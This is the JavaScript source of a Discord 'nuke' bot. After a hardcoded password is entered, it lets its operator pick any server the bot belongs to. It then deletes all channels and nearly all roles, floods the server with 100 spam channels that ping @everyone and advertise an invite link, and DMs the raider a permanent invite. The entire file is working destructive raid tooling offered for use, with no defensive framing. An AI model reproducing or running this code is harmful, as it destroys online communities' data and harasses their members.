const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORD
const MAIN_PASSWORD = 'flower2017';

// EXPRESS
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

// CONFIG
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// READY
client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// MESSAGE EVENTS
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  if (message.content.trim().toLowerCase() === '!fb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('🔴 REMOTE NUKE')
      .setDescription('Enter password, then choose server.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// INTERACTIONS
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    if (interaction.isButton() && interaction.customId.startsWith('fb_start_')) {
      const modal = new ModalBuilder().setCustomId(`fb_modal_${userId}`).setTitle('Enter Password');
      modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)));
      return await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId.startsWith('fb_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });

      const servers = client.guilds.cache.map(g => ({
        label: g.name.length > 25 ? g.name.slice(0, 22) + '...' : g.name,
        value: g.id,
        description: `${g.memberCount} members`
      }));

      const menu = new StringSelectMenuBuilder().setCustomId(`fb_server_${userId}`).setPlaceholder('Choose server to NUKE').addOptions(servers);
      const row = new ActionRowBuilder().addComponents(menu);

      await interaction.reply({ content: '✅ Password correct! Select server:', components: [row], ephemeral: true });
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fb_server_')) {
      await interaction.deferUpdate();

      const guildId = interaction.values[0];
      const guild = client.guilds.cache.get(guildId);

      if (!guild) return interaction.followUp({ content: '❌ Server not found.', ephemeral: true });

      const user = interaction.user;

      await interaction.followUp({ content: `🔴 **RAIDING ${guild.name}** - Starting ultra spam...`, ephemeral: true });

      try {
        // Delete everything
        for (const channel of guild.channels.cache.values()) await channel.delete().catch(() => {});
        for (const role of guild.roles.cache.values()) {
          if (role.name === '@everyone' || role.name === 'Owner') continue;
          await role.delete().catch(() => {});
        }

        // ULTRA FAST SPAM CHANNELS + INVITE IN EVERY CHANNEL
        for (let i = 0; i < 100; i++) {  // 100 channels for very fast spam
          const spamChannel = await guild.channels.create({
            name: 'ew',
            type: ChannelType.GuildText
          }).catch(() => null);

          if (spamChannel) {
            const invite = await spamChannel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
            if (invite) {
              await spamChannel.send(`@everyone\nJoin fame unlocked: discord.gg/fameunlocked`).catch(() => {});
            }
          }
        }

        // DM you the last invite
        const finalChannel = guild.channels.cache.find(c => c.name === 'ew');
        if (finalChannel) {
          const invite = await finalChannel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
          if (invite) {
            await user.send(`✅ **Raid Finished on ${guild.name}**\nPermanent Invite: https://discord.gg/${invite.code}`);
          }
        }

        await interaction.followUp({ content: `✅ **${guild.name}** fully nuked with massive spam! Check your DMs.`, ephemeral: true });
      } catch (err) {
        console.error(err);
        await interaction.followUp({ content: '⚠️ Raid partially failed.', ephemeral: true });
      }
    }
  } catch (error) {
    console.error(error);
  }
});

client.login(TOKEN);
